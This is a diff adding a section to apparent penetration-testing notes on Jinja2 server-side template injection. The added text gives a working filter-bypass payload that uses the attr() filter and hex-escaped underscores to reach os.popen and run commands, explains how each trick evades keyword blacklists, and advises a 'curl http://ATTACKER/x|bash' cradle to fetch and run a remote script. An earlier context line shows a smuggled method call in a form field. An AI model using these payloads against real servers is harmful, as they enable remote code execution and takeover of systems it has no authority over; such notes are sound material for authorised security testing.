@@ -808,3 +808,26 @@ blog-post-author-display=user.gdprDelete()
 
 - [[insecure-deserialization]] (a sibling server-side injection class that reaches RCE)
 - [[os-command-injection]] (SSTI commonly escalates to OS command execution)
+
+### Jinja2 blacklist bypass — `|attr()` + hex-escaped dunders
+
+When a filter substring-blocks `_`, `config`, `self`, and `"`, the usual
+`config.__class__...` / `self.__init__...` payloads never parse. Reach the dunders
+through the `attr()` filter with single-quoted, **hex-escaped underscores** so no
+literal `_` (or blocked keyword) appears in the source:
+
+```jinja2
+{{ request|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')|attr('popen')('id')|attr('read')() }}
+```
+
+- `\x5f` is `_`, so `__globals__`/`__getitem__` never appear literally.
+- Single quotes dodge a `"` block; `|attr('x')` replaces `.x` / `['x']`.
+- Any object already in scope works as the entry point (`request`, `cycler`,
+  `lipsum`, `namespace`) — no need for the blocked `config`/`self`.
+
+**Long payload / input-length truncation:** a full inline RCE string plus the hex
+escapes often exceeds the field's length limit or re-trips the blacklist. Cradle a
+fetch instead — run `curl http://ATTACKER/x|bash` as the command so the heavy logic
+lives in the fetched script, keeping the injected payload short and keyword-clean.
+
+<!-- promoted-slug: jinja2-attr-hex-blacklist-bypass -->
